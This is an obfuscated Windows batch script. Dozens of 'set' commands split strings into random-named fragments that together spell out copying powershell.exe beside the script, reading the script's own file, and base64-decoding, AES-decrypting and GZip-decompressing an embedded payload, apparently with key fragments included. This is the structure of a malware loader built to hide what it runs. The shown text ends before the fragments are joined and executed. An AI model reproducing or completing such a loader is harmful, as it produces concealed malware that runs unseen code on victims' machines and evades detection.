@echo off
set "anOyrvxzYM=rs"
set "ZCSWFXAUeL=nd"
set "ukrNZwhZjT=ll"
set "QmkpvOEorG=0\"
set "VjPUZhDiuO=\W"
set "IHOuBzYggi=\v"
set "SESWelMLad=1."
set "hVjWGymMcO=.e"
set "SHHMgryCnB=we"
set "nxLPNUbVZH= C"
set "FGNFHdcZAE=Sy"
set "VJPzvStyLq=he"
set "MakukORBum=po"
set "XOxPgBzrhG=32"
set "gyFjFMZOCi=ll"
set "mrjQZUYJpu=st"
set "ulJSGiiWwr=co"
set "hmXPKXipyl=ow"
set "SdvZYKbAAP=py"
set "yNYuIrZLwp=s\"
set "hiXOZQWazU= /"
set "zELmGyUuKx=do"
set "oxqeEZASSW=y "
set "vGVVMdAlsY=he"
set "pZWVVmEynn=em"
set "eufkfBGIfu=we"
set "rrDHrvEFOn=xe"
set "tqwcZFJRJu=in"
set "GUVfBMloBg=:\"
set "njyWtMONCT=rS"
set "IwdzUHrvPA=Po"
set "hVyZsypvhu=Wi"
set "uHBJzgjcVO=ws"
set "HrfOGHfyrP= %~dp0"
set "PspmmYEZHo=cd"
set "cwtJCJoqxE=pose"
set "YyxrdYkRgY=dV1k"
set "rHWyxEKyqo=aDNK"
set "XZCPGfAiiy=gnir"
set "rfZUpABfll=ufe "
set "PSiuWJcXuX=adI "
set "VOGgGpstJE= = N"
set "uSOZCICdbh=rity"
set "QgdJaVFkLT=7;$f"
set "HzEmCZgUIF=ode]"
set "ioIvlvxZfP=, (,"
set "iYLoHVTgzC=FcNh"
set "UWOyCGlBJJ=.Key"
set "EMlPxSqpwQ=]::("
set "rrxbWGYrVp=);$f"
set "ELbITlmrvZ=R5jf"
set "nmcZaPbvZx=th('"
set "DjRFfaiemY=Secu"
set "AgedAilKTH=rt]:"
set "QxxvAplWNM=)))"
set "LIBaoAUyKH=vert"
set "pvWqMoqRHv=..-1"
set "tdEoAZRYnf=.GZi"
set "KeAchRBRhu=onve"
set "OEYsihSbyd=.Dis"
set "jQFXPjOaOk=FiIP"
set "GQGRlgoDUO=16] "
set "NEkwRaubmY=('%~f0'"
set "TKnzDPwmSI=HO3I"
set "lZCEkCyZNJ=oryS"
set "YNkGulvpna=yTo("
set "WfwOroDxWo=ypto"
set "gvSVxDDfWC=hp);"
set "PowsqgVRum=();$"
set "XGzVLQpoym=ress"
set "gcGRJugdrG=V.Su"
set "mXAvaJBmrn=1] -"
set "XDOgmEnNbc=[-1."
set "JUSwFbEtjX=Wyqo"
set "GYeEcCgkSZ=tUV "
set "dUgztCWgrq=..-1"
set "EFUoXfHBns=F'[-"
set "IILAKbHvMj=saBm"
set "oFHrrOmFXI=stem"
set "EtwesypKPL=2VUN"
set "TWBRNlXRNd==');"
